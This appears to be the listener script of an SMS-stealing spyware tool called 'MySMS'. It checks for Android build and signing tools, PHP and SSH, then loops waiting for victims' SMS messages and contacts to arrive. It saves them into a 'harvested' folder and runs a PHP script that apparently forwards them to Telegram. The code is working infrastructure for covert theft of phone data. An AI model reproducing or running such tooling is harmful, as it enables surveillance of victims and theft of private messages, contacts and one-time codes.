#!/usr/bin/env bash

#trap 'printf "\n";stop' 2
#
#stop() {

#if [[ $checkphp == *'php'* ]]; then
#killall -2 php > /dev/null 2>&1
#fi
#if [[ $checkssh == *'ssh'* ]]; then
#killall -2 ssh > /dev/null 2>&1
#fi
#exit 1
##
#
#}

dependencies() {
    local required_commands=("apksigner" "php" "ssh" "gradle")
    for cmd in "${required_commands[@]}"; do
        command -v "$cmd" > /dev/null 2>&1 || {
            echo >&2 "I require $cmd but it's not installed. Install it. Aborting."
            exit 1
        }
    done
}


banner() {


printf "\e[1;77m   __  __       ____  __  __ ____   \n"
printf "  |  \/  |_   _/ ___||  \/  / ___|  \n"
printf "  | |\/| | | | \___ \| |\/| \___ \  \n"
printf "  | |  | | |_| |___) | |  | |___) | \n"
printf "  |_|  |_|\__, |____/|_|  |_|____/ v1.0 \n"
printf "          |___/\e[0m\e[1;92m Author: @papusingh2sms\e[0m\n"
printf "\n"
}

checksms() {
mkdir harvested
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting SMS and Contacts incoming,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "sms.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] SMS Received!\n"
cat sms.txt >> ./harvested/sms.saved.txt
php telegram-doc.php
#rm -rf sms.txt
printf "\n\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m sms.saved.txt\e[0m\n"
fi
sleep 0.5
if [[ -e "contacts.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Contacts Received!\n"
cat contacts.txt >> ./harvested/contacts.saved.txt
#rm -rf contacts.txt
printf "\n\e[1;92m[\e[0m*\e[1;92m] Saved:\e[0m\e[1;77m contacts.saved.txt\e[0m\n"
fi
sleep 0.5


done 

}
banner
#dependencies
checksms
